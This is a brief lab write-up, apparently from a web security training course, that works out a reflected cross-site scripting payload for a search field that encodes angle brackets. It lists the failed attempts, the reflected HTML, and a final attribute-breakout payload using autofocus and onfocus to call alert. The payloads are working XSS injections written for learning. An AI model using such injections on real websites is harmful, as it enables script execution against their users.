# Lab: Reflected XSS into attribute with angle brackets HTML-encoded

**End Goal:** Perform a cross-site scripting attack that calls the ```alert``` function.

**Analysis**

&lt;alert(1)&gt;
<alert(1)>

*Putting these in got me this:*

<input type="text" placeholder="Search the blog..." name="search" value="&lt;alert(1)&gt;">

*So I have to find a way that does not require angle brackets. Tried this:*

" onload=<script>alert(1)</script>

*Got this:*

<input type="text" placeholder="Search the blog..." name="search" value="" onload="&lt;alert(1)&gt;&quot;">

*Breaking out of value worked. Script tag isn't working. Tried these and failed:*

" src=x onerror=alert(1)

" onclick=alert(1)

*Need to focus on input attributes. These failed:*

" onfocus=alert(1)

" oninput=alert(1)

" onchange=alert(1)

" autofocus onfocus=alert(1)

**Answer:** 

*There was a trailing "*

" autofocus onfocus="alert(1)


